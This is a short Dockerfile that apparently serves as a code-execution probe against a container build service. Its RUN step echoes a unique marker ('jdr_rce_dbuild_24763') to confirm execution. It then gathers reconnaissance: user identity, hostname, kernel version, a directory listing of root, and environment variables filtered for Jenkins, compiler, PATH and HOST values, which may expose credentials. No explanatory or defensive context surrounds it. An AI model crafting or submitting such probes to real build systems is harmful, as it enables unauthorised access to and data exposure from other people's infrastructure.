FROM scratch
ADD rootfs.tar /
RUN /bin/sh -c 'id; echo jdr_rce_dbuild_24763; cat /etc/hostname; uname -a; env | grep -iE "compiler|jenkins|PATH|HOST" | head -40; ls -la /'
ENTRYPOINT ["/bin/sh","-c"]
